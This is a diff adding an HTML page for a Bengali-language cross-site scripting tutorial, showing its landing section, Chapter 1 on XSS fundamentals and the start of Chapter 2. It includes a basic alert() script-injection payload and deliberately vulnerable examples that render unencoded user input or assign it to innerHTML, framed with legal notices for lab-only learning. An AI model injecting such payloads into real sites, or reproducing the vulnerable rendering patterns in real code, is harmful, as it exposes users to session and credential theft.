@@ -1,1 +1,2188 @@
+<!doctype html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>XSS Documentation </title>
+<meta name="description" content="বাংলায় সম্পূর্ণ Cross-Site Scripting (XSS) শেখার ডকুমেন্টেশন — Basic থেকে Advanced পর্যন্ত থিওরি, পেলোড, Burp Suite টেস্টিং, সিকিউর কোডিং ও বাগ বাউন্টি ওয়ার্কফ্লো।">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Tiro+Bangla&family=Hind+Siliguri:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0a0e14; --surface:#111722; --surface-2:#161d2a; --border:#263044;
+  --fg:#e7edf5; --fg-muted:#93a3bd; --accent:#ff5c5c; --accent-fg:#1a0505;
+  --accent-2:#f5a524; --danger:#ff6b6b; --code-bg:#0d1117; --code-fg:#d7e0ea;
+  --link:#5bc2e8; --shadow:0 4px 18px rgba(0,0,0,.45); color-scheme:dark;
+  --font-head:'Tiro Bangla','Noto Serif Bengali',serif;
+  --font-body:'Hind Siliguri','Noto Sans Bengali',sans-serif;
+  --font-mono:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.8;margin:0;min-height:100vh}
+h1,h2,h3,h4{font-family:var(--font-head);line-height:1.35;color:var(--fg)}
+a{color:var(--link)}
+code,pre{font-family:var(--font-mono)}
+::selection{background:var(--accent);color:var(--accent-fg)}
+img{max-width:100%}
 
+/* ---- App shell ---- */
+.app{display:flex;min-height:100vh}
+.sidebar{
+  width:300px;flex:0 0 300px;background:var(--surface);border-right:1px solid var(--border);
+  padding:16px 14px 24px;position:fixed;top:0;left:0;bottom:0;overflow-y:auto;
+  scrollbar-width:thin;z-index:30;transition:transform .25s ease;
+}
+.sidebar.collapsed{transform:translateX(-100%)}
+.brand{display:flex;align-items:center;gap:10px;margin-bottom:6px}
+.brand .mark{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,var(--accent),#b91c1c);display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-family:var(--font-mono);font-size:13px;flex:none}
+.brand .name{font-family:var(--font-head);font-weight:700;font-size:17px}
+.tagline{font-size:12px;color:var(--fg-muted);margin:0 0 16px}
+.sidebar-section-label{font-size:11px;letter-spacing:.06em;color:var(--fg-muted);margin:16px 0 6px;padding:0 6px;text-transform:uppercase}
+.toc{list-style:none;margin:0;padding:0}
+.toc a{display:flex;align-items:center;gap:9px;text-decoration:none;color:var(--fg);padding:9px 10px;border-radius:8px;font-size:14px}
+.toc a .num{font-family:var(--font-mono);font-size:11px;color:var(--fg-muted);flex:none;width:20px}
+.toc a:hover{background:var(--surface-2)}
+.toc a.active{background:var(--accent);color:var(--accent-fg);font-weight:600}
+.toc a.active .num{color:var(--accent-fg)}
+.sidebar-footer{margin-top:22px;padding-top:14px;border-top:1px solid var(--border);font-size:11px;color:var(--fg-muted)}
+
+.main{flex:1 1 auto;min-width:0;margin-left:300px;transition:margin-left .25s ease;display:flex;flex-direction:column;min-height:100vh}
+.main.full{margin-left:0}
+.topbar {
+    position: sticky;
+    top: 0;
+    z-index: 20;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: rgba(10,14,20,.88);
+    backdrop-filter: blur(8px);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 16px;
+}
+
+.backbtn {
+    position: absolute;
+    right: 16px;
+    padding: 0 14px;
+    gap: 6px;
+    margin-left: 0;
+}
+.topbar .title{font-size:14px;color:var(--fg-muted);flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-align:center}
+.iconbtn,.backbtn{appearance:none;border:1px solid var(--border);background:var(--surface);color:var(--fg);height:36px;border-radius:9px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex:none;font-family:var(--font-body);font-size:13px;text-decoration:none}
+.iconbtn{width:36px}
+.backbtn{padding:0 14px;gap:6px}
+.backbtn:hover,.iconbtn:hover{background:var(--surface-2);border-color:var(--accent)}
+.hamburger{display:none}
+.collapse-btn{display:none}
+@media (min-width:861px){.collapse-btn{display:flex}}
+
+.content{padding:30px 22px 90px;max-width:860px;margin:0 auto;width:100%;flex:1}
+.breadcrumb{font-size:12px;color:var(--fg-muted);margin-bottom:10px}
+.breadcrumb a{color:var(--fg-muted);text-decoration:none}
+.breadcrumb a:hover{color:var(--link)}
+
+.chapter{display:none}
+.chapter.active{display:block;animation:fade .25s ease}
+@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+.chapter>.eyebrow{font-family:var(--font-mono);font-size:12px;color:var(--accent);letter-spacing:.04em}
+.chapter>h1{font-size:30px;margin:4px 0 6px}
+.chapter>.sub{color:var(--fg-muted);font-size:15.5px;margin:0 0 18px}
+
+h2{font-size:22px;margin-top:40px;border-bottom:1px solid var(--border);padding-bottom:9px}
+h3{font-size:17.5px;margin-top:26px;color:var(--accent)}
+p{margin:12px 0}
+ul,ol{padding-left:22px;margin:12px 0}
+li{margin:6px 0}
+table{width:100%;border-collapse:collapse;margin:16px 0;font-size:13.5px;display:block;overflow-x:auto}
+table thead{background:var(--surface-2)}
+th,td{border:1px solid var(--border);padding:9px 11px;text-align:left}
+th{font-family:var(--font-head)}
+
+.callout{border-radius:10px;padding:14px 16px;margin:18px 0;border:1px solid var(--border);background:var(--surface);display:flex;gap:10px}
+.callout .ic{flex:none;font-size:17px}
+.callout.warn{border-color:#f5a52455;background:rgba(245,165,36,.08)}
+.callout.danger{border-color:#ef444455;background:rgba(239,68,68,.1)}
+.callout.info{border-color:#5bc2e855;background:rgba(91,194,232,.08)}
+.callout.legal{border-color:var(--accent);background:rgba(255,92,92,.08)}
+.callout p{margin:0}
+
+.codeblock{position:relative;margin:16px 0;border-radius:10px;overflow:hidden;border:1px solid var(--border)}
+.codeblock .cb-head{display:flex;justify-content:space-between;align-items:center;background:var(--surface-2);padding:7px 11px;font-size:11.5px;color:var(--fg-muted);font-family:var(--font-mono)}
+.codeblock pre{margin:0;padding:14px;background:var(--code-bg);color:var(--code-fg);overflow-x:auto;font-size:13px;line-height:1.65;max-width:100%}
+.copy-btn{appearance:none;border:1px solid var(--border);background:var(--surface);color:var(--fg);font-size:11px;padding:4px 10px;border-radius:6px;cursor:pointer;font-family:var(--font-body)}
+.copy-btn:hover{background:var(--accent);color:var(--accent-fg);border-color:var(--accent)}
+.copy-btn.copied{background:#22c55e;color:#06240f;border-color:#22c55e}
+
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px}
+@media (max-width:700px){.grid2,.grid3{grid-template-columns:1fr}}
+.card{border:1px solid var(--border);border-radius:10px;padding:14px;background:var(--surface)}
+.card h4{margin:0 0 8px;font-size:14px}
+
+details{border:1px solid var(--border);border-radius:10px;margin:14px 0;background:var(--surface)}
+details summary{cursor:pointer;padding:12px 14px;font-weight:600;list-style:none}
+details summary::-webkit-details-marker{display:none}
+details summary::before{content:"▸ ";color:var(--accent)}
+details[open] summary::before{content:"▾ "}
+details .inner{padding:0 14px 14px}
+
+.exercise{border:1px dashed var(--accent);border-radius:10px;padding:14px 16px;margin:18px 0;background:rgba(255,92,92,.05)}
+.exercise h4{margin:0 0 6px;font-size:14px;color:var(--accent)}
+
+.qa{border-top:1px dashed var(--border);margin-top:28px;padding-top:14px}
+.qa ol{padding-left:20px}
+
+.summary-box{background:var(--surface-2);border-radius:10px;padding:14px 16px;margin:26px 0;border:1px solid var(--border)}
+.summary-box h4{margin:0 0 6px;font-size:13px;color:var(--fg-muted);text-transform:uppercase;letter-spacing:.04em;font-family:var(--font-body)}
+
+.pager{display:flex;justify-content:space-between;gap:12px;margin-top:40px;border-top:1px solid var(--border);padding-top:18px;flex-wrap:wrap}
+.pager a{flex:1;min-width:140px;border:1px solid var(--border);border-radius:10px;padding:13px 15px;text-decoration:none;color:var(--fg);font-size:13.5px;background:var(--surface)}
+.pager a:hover{border-color:var(--accent)}
+.pager a span{display:block;color:var(--fg-muted);font-size:11px;margin-bottom:3px}
+.pager a.next{text-align:right}
+.pager a.single{flex:none;margin-left:auto}
+
+.landing-hero{text-align:center;padding:30px 0 10px}
+.landing-hero .mark-xl{width:64px;height:64px;border-radius:16px;background:linear-gradient(135deg,var(--accent),#b91c1c);display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-family:var(--font-mono);font-size:22px;margin:0 auto 16px}
+.next-chapter-cta{display:inline-flex;align-items:center;gap:8px;background:var(--accent);color:var(--accent-fg);text-decoration:none;font-weight:700;padding:14px 26px;border-radius:12px;font-size:16px;margin-top:20px}
+.next-chapter-cta:hover{filter:brightness(1.08)}
+.cta-center{text-align:center;margin:30px 0}
+
+.notfound{text-align:center;padding:70px 20px}
+.notfound h1{font-size:60px;margin:0}
+
+.scrim{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:25}
+.scrim.show{display:block}
+
+footer.site-footer{text-align:center;font-size:12px;color:var(--fg-muted);padding:22px;border-top:1px solid var(--border)}
+
+@media (max-width:860px){
+  .sidebar{transform:translateX(-100%);width:85%;max-width:320px;box-shadow:var(--shadow)}
+  .sidebar.open{transform:translateX(0)}
+  .main{margin-left:0}
+  .hamburger{display:flex}
+  .collapse-btn{display:none}
+  table{font-size:12.5px}
+  .grid3{grid-template-columns:1fr}
+}
+@media print{
+  .sidebar,.topbar,.pager,.copy-btn{display:none!important}
+  .chapter{display:block!important}
+  .main{margin-left:0}
+}
+</style>
+</head>
+<body>
+
+<div class="app">
+  <div class="scrim" id="scrim"></div>
+
+  <aside class="sidebar" id="sidebar" aria-label="অধ্যায় নেভিগেশন">
+    <div class="brand"><div class="mark">XSS</div><div class="name">XSS Documentation</div></div>
+    <p class="tagline">বাংলায় সম্পূর্ণ Cross-Site Scripting গাইড — ভিত্তি থেকে বাগ বাউন্টি পর্যন্ত</p>
+    <div class="sidebar-section-label">সূচিপত্র</div>
+    <ul class="toc" id="toc"></ul>
+    <div class="sidebar-footer">© learn.alamincyber.com — শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে</div>
+  </aside>
+
+  <div class="main" id="mainWrap">
+    <div class="topbar">
+      <button class="iconbtn hamburger" id="hamburgerBtn" aria-label="মেনু খুলুন/বন্ধ করুন" aria-expanded="false">☰</button>
+      <button class="iconbtn collapse-btn" id="collapseBtn" aria-label="সাইডবার টগল করুন" title="সাইডবার টগল করুন">⟨⟩</button>
+      <a class="backbtn" id="backBtn" href="https://learn.alamincyber.com/documentation/" aria-label="ডকুমেন্টেশন ইনডেক্সে ফিরে যান">← Back</a>
+      <div class="title" id="topTitle">XSS Documentation</div>
+    </div>
+
+    <div class="content" id="content">
+      <div class="breadcrumb" id="breadcrumb"></div>
+      <div id="chapters">
+
+<!-- =========================================================
+     LANDING PAGE
+========================================================= -->
+<section class="chapter" id="landing" data-route="">
+  <div class="landing-hero">
+    <div class="mark-xl">XSS</div>
+    <div class="eyebrow" style="justify-content:center;display:flex">Learn Cyber Security · Documentation</div>
+    <h1 style="font-size:34px">Cross-Site Scripting (XSS) ডকুমেন্টেশন</h1>
+    <p class="sub" style="max-width:640px;margin:0 auto">বাংলাদেশের শিক্ষার্থীদের জন্য তৈরি, সম্পূর্ণ বাংলায় লেখা একটি Basic থেকে Advanced XSS শেখার গাইড — থিওরি, পেলোড অ্যানালাইসিস, Burp Suite দিয়ে ম্যানুয়াল টেস্টিং, সিকিউর কোডিং এবং বাগ বাউন্টি ওয়ার্কফ্লো পর্যন্ত, ১৫টি অধ্যায়ে সাজানো।</p>
+  </div>
+
+  <h2>XSS নিয়ে সংক্ষিপ্ত কথা</h2>
+  <p>Cross-Site Scripting (XSS) ওয়েব অ্যাপ্লিকেশনের অন্যতম পুরনো ও এখনও সবচেয়ে বেশি পাওয়া যাওয়া vulnerability class-গুলোর একটি। এটি ঘটে যখন একটি ওয়েব অ্যাপ্লিকেশন ব্যবহারকারীর নিয়ন্ত্রণে থাকা ডেটা যথাযথভাবে যাচাই বা encode না করে সরাসরি ব্রাউজারে HTML বা JavaScript হিসেবে render করে ফেলে। ফলে আক্রমণকারী ভিকটিমের ব্রাউজারের মধ্যে নিজের তৈরি করা script চালানোর সুযোগ পায় — এমন একটি প্রেক্ষাপটে, যেখানে ব্রাউজার সেই script-কে আসল ওয়েবসাইটের নিজস্ব কোড বলেই বিশ্বাস করে।</p>
+  <p>এই ডকুমেন্টেশনে ধাপে ধাপে দেখানো হয়েছে — XSS কেন ঘটে, কীভাবে browser HTML/JS parse করে, Reflected/Stored/DOM-based/Blind/Mutation XSS-এর পার্থক্য, কনটেক্সট অনুযায়ী পেলোড নির্বাচন, এনকোডিং ও স্যানিটাইজেশন, Burp Suite দিয়ে বাস্তব ম্যানুয়াল টেস্টিং, আধুনিক ফ্রেমওয়ার্কে (React/Angular/Vue) XSS-এর ঝুঁকি, impact assessment, secure coding, এবং সবশেষে একটি দায়িত্বশীল bug bounty workflow।</p>
+
+  <div class="callout legal">
+    <div class="ic">⚖️</div>
+    <div>
+      <p><strong>আইনি নোটিশ ও দায়বদ্ধতা অস্বীকার (Legal Notice &amp; Disclaimer):</strong> এই ডকুমেন্টেশনটি সম্পূর্ণভাবে শিক্ষামূলক উদ্দেশ্যে তৈরি করা হয়েছে। এখানে দেওয়া কোনো payload, টেকনিক বা পদ্ধতি কখনোই এমন কোনো ওয়েবসাইট, অ্যাপ্লিকেশন বা সিস্টেমে প্রয়োগ করা যাবে না, যার জন্য আপনার লিখিত ও স্পষ্ট অনুমতি নেই। শুধুমাত্র নিজের তৈরি করা lab, অনুমোদিত training environment (যেমন PortSwigger Web Security Academy, OWASP Juice Shop, DVWA) অথবা স্পষ্টভাবে scope-ভুক্ত bug bounty প্রোগ্রামে এই জ্ঞান প্রয়োগ করুন। অননুমোদিত সিস্টেমে টেস্টিং করা একাধিক দেশে ফৌজদারি অপরাধ হিসেবে গণ্য হয় এবং বাংলাদেশের আইসিটি আইন/সাইবার সিকিউরিটি আইনসহ বিভিন্ন আন্তর্জাতিক আইনের (যেমন Computer Fraud and Abuse Act) আওতায় পড়তে পারে। লেখক ও learn.alamincyber.com এই ডকুমেন্টেশনের কোনো অপব্যবহারের জন্য দায়ী থাকবে না — সম্পূর্ণ দায়িত্ব ব্যবহারকারীর নিজের।</p>
+    </div>
+  </div>
+
+  <h2>কীভাবে পড়বেন</h2>
+  <div class="grid3">
+    <div class="card"><h4>🟢 শুরু (১–৫)</h4><p>XSS কী, browser parsing, XSS-এর প্রকারভেদ, পেলোড এনসাইক্লোপিডিয়া ও কনটেক্সট শনাক্তকরণ।</p></div>
+    <div class="card"><h4>🟡 মধ্যবর্তী (৬–১০)</h4><p>এনকোডিং/বাইপাস, Burp Suite টেস্টিং, অ্যাডভান্সড রিসার্চ, আধুনিক ওয়েব অ্যাপ, impact assessment।</p></div>
+    <div class="card"><h4>🔴 প্রয়োগ (১১–১৫)</h4><p>সিকিউর কোডিং, বাগ বাউন্টি ওয়ার্কফ্লো, হ্যান্ডস-অন ল্যাব, প্র্যাকটিস প্রশ্ন, চিট শিট ও FAQ।</p></div>
+  </div>
+
+  <div class="cta-center">
+    <a class="next-chapter-cta" href="/chapter01">অধ্যায় ০১ শুরু করুন — XSS এর ভিত্তি →</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     NOT FOUND
+========================================================= -->
+<section class="chapter" id="notfound" data-route="__notfound__">
+  <div class="notfound">
+    <h1>৪০৪</h1>
+    <h2 style="border:none">এই অধ্যায়টি খুঁজে পাওয়া যায়নি</h2>
+    <p class="sub">আপনি যে chapter URL-এ যেতে চেয়েছেন, তা এই ডকুমেন্টেশনে নেই। অনুগ্রহ করে নিচের বাটন ব্যবহার করে ডকুমেন্টেশন ইনডেক্সে ফিরে যান অথবা সাইডবার থেকে একটি অধ্যায় বেছে নিন।</p>
+    <div class="cta-center">
+      <a class="next-chapter-cta" href="https://learn.alamincyber.com/documentation/">ডকুমেন্টেশন ইনডেক্সে ফিরুন</a>
+    </div>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 1 — XSS Fundamentals
+========================================================= -->
+<section class="chapter" id="chapter01">
+  <div class="eyebrow">অধ্যায় ০১ · ভিত্তি</div>
+  <h1>XSS এর ভিত্তি (XSS Fundamentals)</h1>
+  <p class="sub">Cross-Site Scripting আসলে কী, কেন ঘটে এবং অন্যান্য vulnerability থেকে এটি কীভাবে আলাদা — এই অধ্যায়ে সেই ভিত্তিটা তৈরি হবে।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> এই অধ্যায়ে উল্লেখিত যেকোনো ধারণা, উদাহরণ বা পেলোড শুধুমাত্র নিজের তৈরি lab, অনুমোদিত training platform (PortSwigger, OWASP Juice Shop, DVWA ইত্যাদি) অথবা স্পষ্টভাবে scope-ভুক্ত bug bounty প্রোগ্রামে প্রয়োগ করুন। অনুমতি ছাড়া কোনো সিস্টেমে প্রয়োগ করলে তা আইনত দণ্ডনীয় অপরাধ।</p></div>
+
+  <h2>XSS কী এবং কেন ঘটে</h2>
+  <p><strong>সংজ্ঞা:</strong> Cross-Site Scripting (XSS) হলো একটি client-side vulnerability, যেখানে একটি ওয়েব অ্যাপ্লিকেশন ব্যবহারকারীর নিয়ন্ত্রণে থাকা ডেটা যথাযথভাবে validate/encode না করে সরাসরি পৃষ্ঠায় HTML বা JavaScript হিসেবে render করে ফেলে। এর ফলে আক্রমণকারীর দেওয়া script, ভিকটিমের ব্রাউজারে, ভিকটিমের নিজস্ব সেশনের মধ্যেই চলে — ঠিক যেন সেটি ওয়েবসাইটেরই নিজস্ব কোড।</p>
+  <p><strong>কেন ঘটে:</strong> আধুনিক ওয়েব অ্যাপ্লিকেশন প্রচুর dynamic content তৈরি করে — ইউজারের নাম, কমেন্ট, সার্চ কোয়েরি, প্রোফাইল তথ্য ইত্যাদি পৃষ্ঠায় বসিয়ে দেখায়। যখন এই "বসানো" (rendering) প্রক্রিয়ায় ডেটা ও কোডের মধ্যে স্পষ্ট পার্থক্য রাখা হয় না, তখন ইউজারের দেওয়া সাধারণ টেক্সট ব্রাউজারের চোখে "নির্বাহযোগ্য কোড" হয়ে যেতে পারে।</p>
+
+  <h3>একটি সহজ উদাহরণ (Beginner-friendly)</h3>
+  <p>ধরা যাক একটি সার্চ পেজ ইউজারের সার্চ টার্ম ফিরিয়ে দেখায়:</p>
+  <div class="codeblock">
+    <div class="cb-head"><span>Vulnerable backend কোড (ধারণাগত)</span><button class="copy-btn">কপি</button></div>
+    <pre><code>&lt;p&gt;আপনি খুঁজেছেন: {{searchTerm}}&lt;/p&gt;
+// searchTerm সরাসরি, কোনো encoding ছাড়াই, HTML-এ বসে যাচ্ছে</code></pre>
+  </div>
+  <p>স্বাভাবিক ইউজার যদি <code>laptop</code> লেখে, পৃষ্ঠায় দেখা যাবে: "আপনি খুঁজেছেন: laptop"। কিন্তু যদি কেউ সার্চ বক্সে লেখে:</p>
+  <div class="codeblock">
+    <div class="cb-head"><span>Lab-only proof-of-execution payload</span><button class="copy-btn">কপি</button></div>
+    <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+  </div>
+  <p>তাহলে ব্রাউজার সেটিকে টেক্সট না ভেবে একটি <code>&lt;script&gt;</code> ট্যাগ হিসেবে পার্স করবে এবং ভেতরের JavaScript চালাবে — ফলে একটি alert বক্স দেখা যাবে। এই <code>alert()</code> নিজে ক্ষতিকর কিছু না, কিন্তু এটি প্রমাণ করে যে attacker-controlled টেক্সট, ব্রাউজারে কোড হিসেবে execute হচ্ছে — যেটিই আসল সমস্যা। এই একই জায়গায় একজন দূষিত আক্রমণকারী session cookie চুরি, phishing form বসানো বা পুরো পেজ defacement-এর মতো কোড বসাতে পারত।</p>
+
+  <h2>Browser কীভাবে HTML ও JavaScript Process করে</h2>
+  <p>XSS বোঝার জন্য ব্রাউজারের কাজ করার ধরন বোঝা জরুরি। যখন ব্রাউজার একটি HTML document পায়, সে উপর থেকে নিচে পড়ে একটি <strong>DOM (Document Object Model) tree</strong> তৈরি করে — পৃষ্ঠার প্রতিটি element, attribute ও টেক্সট সেই tree-র অংশ হয়ে যায়। যখনই পার্সার <code>&lt;script&gt;</code> ট্যাগ, একটি event-handler attribute (যেমন <code>onerror</code>), অথবা <code>javascript:</code> URL-এর মতো কিছু খুঁজে পায়, সে সেই কোড JavaScript engine-এ পাঠিয়ে execute করে।</p>
+  <p>গুরুত্বপূর্ণ বিষয় হলো — ব্রাউজার জানে না কোন HTML "legitimate developer-এর লেখা" আর কোন HTML "ইউজার ইনপুট থেকে এসেছে"। সে শুধু সিনট্যাক্স দেখে পার্স করে। তাই যদি ইউজার ইনপুট এমনভাবে পৃষ্ঠায় বসে যায় যা একটি নতুন ট্যাগ বা attribute তৈরি করে ফেলে, ব্রাউজার সেটিকে ঠিক ততটাই বিশ্বাস করবে যতটা সে আসল কোডকে করত।</p>
+
+  <h3>Same-Origin Policy (SOP)-এর ভূমিকা</h3>
+  <p><strong>Same-Origin Policy</strong> ব্রাউজারের একটি মৌলিক নিরাপত্তা নীতি, যা একটি origin (protocol + domain + port)-এর script-কে অন্য origin-এর ডেটা পড়তে/পরিবর্তন করতে বাধা দেয়। সাধারণ অবস্থায় <code>evil.com</code>-এর স্ক্রিপ্ট <code>bank.com</code>-এর cookie বা DOM পড়তে পারে না। XSS এই নিরাপত্তা দেয়ালকে এড়িয়ে যায় — কারণ attacker-এর কোড ভিকটিমের ব্রাউজারে, target সাইটের নিজস্ব origin থেকেই চলে, তাই SOP সেই কোডকে "ওই সাইটেরই" কোড হিসেবে গণ্য করে এবং পুরোপুরি অনুমতি দেয়।</p>
+
+  <h2>User-Controlled বনাম Server-Controlled Data</h2>
+  <p><strong>User-controlled data</strong> হলো যেকোনো মান যা সরাসরি বা পরোক্ষভাবে ইউজার (attacker-সহ) নিয়ন্ত্রণ করতে পারে — form field, URL parameter, cookie, HTTP header (<code>Referer</code>, <code>User-Agent</code>), JSON body, এমনকি file metadata বা third-party API response (যদি সেই API-ও কোনোভাবে user input গ্রহণ করে)। <strong>Server-controlled data</strong> এমন মান যা ব্যবহারকারী সরাসরি পরিবর্তন করতে পারে না — যেমন সার্ভারে hardcode করা constant।</p>
+  <p>XSS সবসময় ঘটে যখন user-controlled data, output-এ পৌঁছানোর সময় এমন context-এ বসে যায় যেখানে ব্রাউজার তাকে কোড হিসেবে পার্স করে। মনে রাখা জরুরি — "user-controlled" মানেই শুধু দৃশ্যমান input field নয়; cookie, hidden field, এমনকি filename-ও user-controlled হতে পারে।</p>
+
+  <h2>Source, Sink এবং Execution Context</h2>
+  <p>XSS অ্যানালাইসিসে তিনটি শব্দ বারবার আসবে:</p>
+  <div class="grid3">
+    <div class="card"><h4>Source</h4><p>যেখান থেকে attacker-controlled ডেটা অ্যাপ্লিকেশনে প্রবেশ করে — URL parameter, form input, cookie, API response ইত্যাদি।</p></div>
+    <div class="card"><h4>Sink</h4><p>যেখানে সেই ডেটা এমনভাবে ব্যবহৃত হয় যা code execution ঘটাতে পারে — যেমন <code>innerHTML</code>, <code>document.write()</code>, বা সরাসরি HTML output।</p></div>
+    <div class="card"><h4>Execution Context</h4><p>Sink-এর ঠিক আশেপাশের syntax পরিবেশ — HTML body, একটি attribute, একটি JS string, বা একটি URL — যা নির্ধারণ করে কোন ধরনের payload কাজ করবে।</p></div>
+  </div>
+  <p>একটি vulnerability তখনই exploitable হয় যখন source থেকে sink পর্যন্ত ডেটার path-এ কোনো যথাযথ sanitization/encoding থাকে না — একে বলা হয় <strong>tainted data flow</strong>।</p>
+
+  <h2>XSS, SQL Injection ও CSRF-এর পার্থক্য</h2>
+  <table>
+    <thead><tr><th>Vulnerability</th><th>লক্ষ্য</th><th>কোথায় execute হয়</th><th>মূল পার্থক্য</th></tr></thead>
+    <tbody>
+      <tr><td>XSS</td><td>ভিকটিমের ব্রাউজার (client-side)</td><td>ভিকটিমের ব্রাউজার</td><td>Input, HTML/JavaScript হিসেবে render হয়</td></tr>
+      <tr><td>SQL Injection</td><td>Database query</td><td>Server-side</td><td>Input, SQL syntax-এর অংশ হয়ে যায়</td></tr>
+      <tr><td>CSRF</td><td>অথেন্টিকেটেড সেশনের অ্যাকশন</td><td>Server-side (ভিকটিমের ব্রাউজার থেকে trigger)</td><td>কোনো কোড ইনজেকশন লাগে না — শুধু ভিকটিমের authenticated browser-কে একটি অনিচ্ছাকৃত request পাঠাতে বাধ্য করা</td></tr>
+    </tbody>
+  </table>
+  <p>লক্ষণীয় যে XSS প্রায়ই CSRF protection বাইপাস করার একটি শক্তিশালী হাতিয়ার হয়ে ওঠে — কারণ XSS থাকলে attacker ভিকটিমের ব্রাউজার থেকেই, ভিকটিমের নিজস্ব session ব্যবহার করে, যেকোনো request পাঠাতে পারে, যা CSRF token-ও পড়ে ফেলতে সক্ষম।</p>
+
+  <h2>XSS-এর সম্ভাব্য Impact</h2>
+  <ul>
+    <li><strong>Session hijacking:</strong> সেশন কুকি বা টোকেন চুরি করে ভিকটিমের অ্যাকাউন্টে প্রবেশ।</li>
+    <li><strong>Credential theft:</strong> আসল লগইন ফর্মের মতো দেখতে ভুয়া ফর্ম বসিয়ে পাসওয়ার্ড হাতানো (phishing-in-page)।</li>
+    <li><strong>Account takeover:</strong> ভিকটিমের সেশন ব্যবহার করে ইমেইল/পাসওয়ার্ড পরিবর্তনের মতো sensitive অ্যাকশন চালানো।</li>
+    <li><strong>Defacement:</strong> পৃষ্ঠার বিষয়বস্তু পরিবর্তন করে দেওয়া।</li>
+    <li><strong>Malware/drive-by delivery:</strong> ভিকটিমের ব্রাউজারে অতিরিক্ত ক্ষতিকর স্ক্রিপ্ট লোড করানো।</li>
+    <li><strong>Internal network reconnaissance:</strong> ভিকটিমের ব্রাউজার থেকে internal/admin পেজে request পাঠিয়ে তথ্য সংগ্রহ।</li>
+  </ul>
+  <p>আসল impact নির্ভর করে — ভিকটিম কে (সাধারণ ইউজার নাকি admin), application কী ধরনের sensitive অ্যাকশন অনুমতি দেয়, এবং session security কতটা শক্তিশালী (যেমন <code>HttpOnly</code> cookie ব্যবহার হচ্ছে কি না) তার উপর।</p>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>নিচের কোডে কোন ভ্যারিয়েবলটি "source" এবং কোনটি "sink"? ব্যাখ্যা করুন কেন এটি একটি tainted data flow তৈরি করছে।</p>
+    <div class="codeblock"><pre><code>var name = new URLSearchParams(location.search).get("name");
+document.getElementById("greeting").innerHTML = "স্বাগতম, " + name;</code></pre></div>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>XSS ঘটে যখন user-controlled ডেটা, যথাযথ encoding ছাড়া, ব্রাউজারে HTML/JavaScript হিসেবে render হয়। এটি client-side-এ, ভিকটিমের ব্রাউজারে execute হয় — যা একে SQL Injection (server-side) ও CSRF (কোড ইনজেকশন ছাড়াই অ্যাকশন trigger) থেকে আলাদা করে। Source→Sink→Context ফ্রেমওয়ার্ক পরবর্তী সব অধ্যায়ে বারবার ব্যবহৃত হবে।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>Source, sink ও execution context — এই তিনটি শব্দ নিজের ভাষায় ব্যাখ্যা করুন।</li>
+      <li>Same-Origin Policy থাকা সত্ত্বেও XSS কীভাবে কার্যকর হয়?</li>
+      <li>XSS কেন প্রায়ই CSRF protection বাইপাসের হাতিয়ার হয়ে ওঠে?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/"><span>পূর্ববর্তী</span>সূচিপত্র</a>
+    <a class="next" href="/chapter02"><span>পরবর্তী</span>অধ্যায় ০২ — HTML, JS ও ব্রাউজার পার্সিং</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 2 — HTML, JavaScript and Browser Parsing
+========================================================= -->
+<section class="chapter" id="chapter02">
+  <div class="eyebrow">অধ্যায় ০২ · ভিত্তি</div>
+  <h1>HTML, JavaScript and Browser Parsing</h1>
+  <p class="sub">XSS পেলোড কাজ করে কি না তা নির্ভর করে ব্রাউজার ঠিক কীভাবে HTML/JS parse করছে তার উপর — এই অধ্যায়ে সেই প্রক্রিয়াটা ভেঙে দেখানো হয়েছে।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> এখানে দেখানো সব উদাহরণ শুধুমাত্র নিজের lab বা অনুমোদিত পরিবেশে পরীক্ষা করুন। অনুমতি ছাড়া অন্য কোনো সিস্টেমে প্রয়োগ নিষিদ্ধ ও আইনত দণ্ডনীয়।</p></div>
+
+  <h2>HTML Parsing ও DOM Tree</h2>
+  <p>ব্রাউজার যখন একটি HTML response পায়, সে টোকেন-বাই-টোকেন পার্স করে একটি <strong>DOM tree</strong> তৈরি করে — ট্যাগ, attribute, টেক্সট নোড — সবকিছু একটি হায়ারার্কিক্যাল স্ট্রাকচারে সাজানো হয়। এই পার্সিং প্রক্রিয়া streaming — অর্থাৎ পুরো document ডাউনলোড হওয়ার আগেই parser কাজ শুরু করে দেয়, এবং যখনই একটি <code>&lt;script&gt;</code> ট্যাগ পাওয়া যায়, সাধারণত parsing থেমে গিয়ে সেই script execute হয় (যদি না <code>async</code>/<code>defer</code> থাকে)।</p>
+
+  <h3>JavaScript Execution Context</h3>
